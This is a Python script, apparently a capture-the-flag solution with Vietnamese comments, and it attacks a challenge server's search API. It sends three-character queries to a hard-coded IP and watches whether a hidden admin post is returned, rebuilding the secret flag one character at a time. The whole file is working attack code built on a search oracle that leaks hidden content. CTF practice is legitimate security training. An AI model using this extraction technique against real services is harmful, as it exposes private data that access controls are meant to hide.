import requests

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}!@#'
discovered = 'L3AK{L3ak1ng_there'  # đoạn bạn đã có

# Lưu trữ các ký tự đã thử nối theo từng cặp 2 ký tự cuối
tried_next_chars = {}

def test_triplet(query):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': query}
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13" and
                post['content'].startswith("Well luckily the content of the flag is hidden")):
                print(f'\n🔍 Query "{query}" matched expected post.')
                print(f'🧾  Content: {post["content"]}')
                return True

    except Exception as e:
        print('❌ Error:', e)

    return False

while True:
    found = False
    last_two = discovered[-2:]
    if last_two not in tried_next_chars:
        tried_next_chars[last_two] = set()

    for c in charset:
        if c in tried_next_chars[last_two]:
            continue  # đã thử rồi, bỏ qua

        triplet = last_two + c

        if test_triplet(triplet):
            discovered += c
            tried_next_chars[last_two].add(c)
            print(f'\n✅ Flag so far: {discovered}')
            found = True

            if c == '}':
                print('\n🎉 Flag fully discovered!')
                exit(0)
            break
        else:
            tried_next_chars[last_two].add(c)

    if not found:
        print('\n⛔️ No more new triplets matched. Done.')
        break
